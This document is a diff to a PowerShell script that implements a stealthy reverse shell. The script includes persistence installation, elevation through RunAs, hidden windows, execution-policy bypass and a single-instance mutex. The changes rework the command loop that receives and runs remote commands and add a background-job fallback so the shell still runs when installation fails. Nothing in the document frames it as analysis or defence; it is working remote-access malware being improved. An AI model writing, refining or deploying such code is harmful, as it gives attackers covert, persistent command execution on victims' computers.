@@ -36,7 +36,7 @@ function Install-Persistence {
             
             $process = Start-Process PowerShell.exe -ArgumentList "-EncodedCommand $encodedCommand" -Verb RunAs -PassThru -WindowStyle Hidden
             if ($process.Id) {
-                Start-Sleep -Seconds 3
+                Start-Sleep -Seconds 5
                 exit 0
             }
         } catch {
@@ -91,12 +91,17 @@ function Invoke-StealthShell {
             $Stream.Write($WelcomeBytes, 0, $WelcomeBytes.Length)
             $Stream.Flush()
             
-            # Data buffer
-            [byte[]]$Bytes = 0..65535 | %{0}
+            # Create a stream reader and writer for easier communication
+            $Reader = New-Object System.IO.StreamReader($Stream)
+            $Writer = New-Object System.IO.StreamWriter($Stream)
+            $Writer.AutoFlush = $true
             
             # Main communication loop
-            while (($i = $Stream.Read($Bytes, 0, $Bytes.Length)) -ne 0) {
-                $Command = [System.Text.Encoding]::ASCII.GetString($Bytes, 0, $i)
+            while ($Client.Connected) {
+                $Command = $Reader.ReadLine()
+                if ($Command -eq $null) {
+                    break
+                }
                 
                 # Execute command and capture output
                 try {
@@ -106,9 +111,7 @@ function Invoke-StealthShell {
                 }
                 
                 # Send output back
-                $ResponseBytes = ([text.encoding]::ASCII).GetBytes($Output)
-                $Stream.Write($ResponseBytes, 0, $ResponseBytes.Length)
-                $Stream.Flush()
+                $Writer.WriteLine($Output)
             }
             
             $Client.Close()
@@ -121,15 +124,12 @@ function Invoke-StealthShell {
     }
 }
 
-# Main execution block
+# Main execution block - this will run in background
 try {
     # Stealth Configuration - Hide window and suppress output
-    $WindowStyle = "Hidden"
-    if ($WindowStyle -eq "Hidden") {
-        try {
-            $null = [System.Console]::SetOut([System.IO.TextWriter]::Null)
-        } catch {}
-    }
+    try {
+        $null = [System.Console]::SetOut([System.IO.TextWriter]::Null)
+    } catch {}
     
     # Check if we're running from installation path
     $isInstalled = ($MyInvocation.MyCommand.Path -eq $InstallPath)
@@ -138,28 +138,22 @@ try {
     if (-not $isInstalled) {
         $installed = Install-Persistence
         if ($installed) {
-            # If we just installed, launch detached process and exit
+            # If we just installed, run from installed location in background
             if (Test-Path $InstallPath) {
-                # Start completely detached process that survives PowerShell closure
-                $psi = New-Object System.Diagnostics.ProcessStartInfo
-                $psi.FileName = "PowerShell.exe"
-                $psi.Arguments = "-WindowStyle Hidden -ExecutionPolicy Bypass -File `"$InstallPath`""
-                $psi.WindowStyle = [System.Diagnostics.ProcessWindowStyle]::Hidden
-                $psi.CreateNoWindow = $true
-                $psi.UseShellExecute = $false
-                
-                $process = New-Object System.Diagnostics.Process
-                $process.StartInfo = $psi
-                $process.Start() | Out-Null
-                
-                # Immediately detach from parent process
-                $process.Dispose()
+                Start-Process PowerShell.exe -ArgumentList "-WindowStyle Hidden -ExecutionPolicy Bypass -File `"$InstallPath`"" -WindowStyle Hidden
                 exit 0
             }
+        } else {
+            # If we can't install, just run the shell in background
+            Start-Job -ScriptBlock {
+                param($IP, $Port, $MaxRetries, $RetryDelay)
+                . (Get-Command Invoke-StealthShell)
+                Invoke-StealthShell -IP $IP -Port $Port -MaxRetries $MaxRetries -RetryDelay $RetryDelay
+            } -ArgumentList $IP, $Port, $MaxRetries, $RetryDelay | Out-Null
+            exit 0
         }
     }
     
-    # If we reach here, we're running from the installed location
     # Execution Guard - Ensure single instance
     $MutexName = "Global\RustCatShellMutex"
     try {
@@ -170,7 +164,7 @@ try {
     }
     
     if ($HasMutex) {
-        # Launch the shell - this runs in the background independently
+        # Launch the shell
         Invoke-StealthShell -IP $IP -Port $Port -MaxRetries $MaxRetries -RetryDelay $RetryDelay
     } else {
         exit 0
